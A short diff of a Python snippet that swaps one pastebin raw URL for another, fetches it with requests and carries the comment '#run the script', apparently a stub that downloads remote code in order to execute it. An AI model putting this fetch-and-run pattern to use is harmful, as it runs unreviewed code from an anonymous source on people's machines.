@@ -1,5 +1,5 @@
 import requests
-link = "https://pastebin.com/raw/Uhmm6bs4"
+link = "https://pastebin.com/raw/Fk9wMF54"
 r = requests.get(link)
 
 #run the script
